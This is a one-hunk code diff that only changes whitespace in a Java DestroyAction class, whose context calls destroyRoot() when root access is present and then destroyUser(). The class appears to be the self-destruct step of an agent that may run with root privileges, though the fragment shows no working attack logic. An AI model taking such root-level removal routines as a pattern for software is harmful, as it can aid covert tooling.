@@ -45,7 +45,7 @@ public class DestroyAction extends SubAction {
 			if (Status.self().haveRoot()) {
 				destroyRoot();
 			}
-			
+
 			destroyUser();
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
